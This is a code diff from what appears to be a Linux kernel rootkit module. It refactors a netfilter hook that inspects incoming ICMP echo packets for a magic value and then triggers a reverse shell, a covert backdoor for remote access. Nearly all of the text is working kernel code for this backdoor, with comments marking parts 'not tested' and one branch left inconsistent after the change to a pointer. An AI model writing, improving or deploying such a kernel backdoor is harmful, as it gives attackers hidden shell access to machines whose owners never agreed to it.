@@ -47,7 +47,7 @@ MODULE_VERSION("0.1");
 
 int reverse_shell_working = 0;
 // global netfilter hook - used for registering hook
-struct nf_hook_ops netf_hook;
+static struct nf_hook_ops *netf_hook = NULL;
 
 // for icmp_listener
 struct auth_icmp {
@@ -92,7 +92,7 @@ void start_reverse_shell(char *ip, char *port) {
 // Search for ICMP Echo packets with the data "hello". 
 // If found, create reverse shell to localhost.
 // not tested.
-unsigned int icmp_listener(void *priv, struct sk_buff *socket_buffer, const struct nf_hook_state *state)
+unsigned int icmp_listener(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
 {
 	const struct iphdr *ip_header;
 	const struct icmphdr *icmp_header;
@@ -102,10 +102,10 @@ unsigned int icmp_listener(void *priv, struct sk_buff *socket_buffer, const stru
 	char *_data;
 	int size, str_size;
 
-	if (!socket_buffer)
+	if (!skb)
 		return NF_ACCEPT;
 
-	ip_header = skb_header_pointer(socket_buffer, 0, sizeof(_iph), &_iph);
+	ip_header = skb_header_pointer(skb, 0, sizeof(_iph), &_iph);
 
 	// Make sure everything works
 	if (!ip_header)
@@ -119,7 +119,7 @@ unsigned int icmp_listener(void *priv, struct sk_buff *socket_buffer, const stru
 
 	// Make sure we're ICMP
 	if (ip_header->protocol == IPPROTO_ICMP) {
-		icmp_header = skb_header_pointer(socket_buffer, ip_header->ihl * 4, sizeof(_icmph), &_icmph);
+		icmp_header = skb_header_pointer(skb, ip_header->ihl * 4, sizeof(_icmph), &_icmph);
 
 		if (!icmp_header)
 			return NF_ACCEPT;
@@ -142,7 +142,7 @@ unsigned int icmp_listener(void *priv, struct sk_buff *socket_buffer, const stru
 
 		str_size = size - strlen(MAGIC_VALUE);
 
-		data = skb_header_pointer(socket_buffer, ip_header->ihl * 4 + sizeof(struct icmphdr), size, &_data);
+		data = skb_header_pointer(skb, ip_header->ihl * 4 + sizeof(struct icmphdr), size, &_data);
 
 		if (!data) {
 			kfree(_data);
@@ -172,21 +172,22 @@ unsigned int icmp_listener(void *priv, struct sk_buff *socket_buffer, const stru
 
 // Register our packets filter
 // not tested.
-int register_icmp_listener(void)
+static int register_icmp_listener(void)
 {
 	int ret;
 
 	debugPrint("Registerig icmp_listener");
-
+	netf_hook = (struct nf_hook_ops*)kcalloc(1, sizeof(struct nf_hook_ops), GFP_KERNEL);
 	/* set flags and function for netfilter */
-	netf_hook.hook = icmp_listener;
-	netf_hook.hooknum = NF_INET_LOCAL_IN;
-	netf_hook.pf = PF_INET;
-	netf_hook.priority = NF_IP_PRI_FIRST;
+	netf_hook->hook = (nf_hookfn*)icmp_listener;
+	netf_hook->hooknum = NF_INET_LOCAL_IN;
+	netf_hook->pf = PF_INET;
+	netf_hook->priority = NF_IP_PRI_FIRST;
 
 	/* register our netfilter hook */
 	#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
-    	ret = nf_register_net_hook(&init_net, &netf_hook);
+		debugPrint("Linux version high");
+    	ret = nf_register_net_hook(&init_net, netf_hook);
 	#else
     	ret = nf_register_hook(&netf_hook);
 	#endif
